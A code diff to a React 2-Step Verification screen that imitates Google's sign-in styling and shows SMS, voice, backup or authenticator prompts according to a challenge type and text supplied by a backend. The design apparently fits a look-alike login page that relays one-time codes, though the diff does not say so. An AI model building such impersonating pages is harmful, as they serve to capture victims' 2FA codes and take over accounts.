@@ -1,3 +1,4 @@
+import { ChallengeMetadata, ChallengeType } from "@/lib/types";
 import React from "react";
 import Input from "../ui/input";
 
@@ -6,21 +7,61 @@ const TOTPView: React.FC<{
   setTwoFactorCode: (code: string) => void;
   handle2FASubmit: () => void;
   error: string | null;
-}> = ({ twoFactorCode, setTwoFactorCode, handle2FASubmit, error }) => {
+  challengeType: ChallengeType;
+  challengeMetadata: ChallengeMetadata | null;
+}> = ({ twoFactorCode, setTwoFactorCode, handle2FASubmit, error, challengeType, challengeMetadata }) => {
+  // Differentiate copy based on challenge type from backend
+  const isSMS = challengeType === "SMS";
+  const isVoice = challengeType === "VOICE";
+  const isBackup = challengeType === "BACKUP";
+
+  let title = "2-Step Verification";
+  let description = (
+    <>
+      Get a verification code from the{" "}
+      <span className="font-semibold text-[#202124]">Google Authenticator</span> app
+    </>
+  );
+
+  if (isSMS) {
+    title = challengeMetadata?.title || "2-Step Verification";
+    description = (
+      <>
+        {challengeMetadata?.description || "A text message with a verification code was sent to your phone."}
+      </>
+    );
+  } else if (isVoice) {
+    title = challengeMetadata?.title || "2-Step Verification";
+    description = (
+      <>
+        {challengeMetadata?.description || "A verification code was sent to your phone via voice call."}
+      </>
+    );
+  } else if (isBackup) {
+    title = challengeMetadata?.title || "2-Step Verification";
+    description = (
+      <>
+        {challengeMetadata?.description || "Enter one of your backup codes."}
+      </>
+    );
+  } else if (challengeMetadata?.description) {
+    // TOTP with custom description from backend
+    description = <>{challengeMetadata.description}</>;
+  }
+
+  // Code length varies: TOTP/SMS/VOICE = 6 digits, BACKUP = 8 digits
+  const codeLength = isBackup ? 8 : 6;
+
   return (
     <div className="w-full animate-in fade-in slide-in-from-right-4 duration-500">
       {/* Section Title */}
       <h2 className="text-[16px] font-normal text-[#202124] mb-2">
-        2-Step Verification
+        {title}
       </h2>
 
-      {/* Description with bold app name */}
+      {/* Description */}
       <p className="text-[14px] text-[#5f6368] mb-6 leading-[20px]">
-        Get a verification code from the{" "}
-        <span className="font-semibold text-[#202124]">
-          Google Authenticator
-        </span>{" "}
-        app
+        {description}
       </p>
 
       {/* Code Input */}
@@ -33,7 +74,7 @@ const TOTPView: React.FC<{
           label="Enter code"
           autoComplete="one-time-code"
           value={twoFactorCode}
-          onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, ""))}
+          onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, "").slice(0, codeLength))}
           error={!!error}
           onKeyDown={(e) => {
             if (e.key === "Enter") {
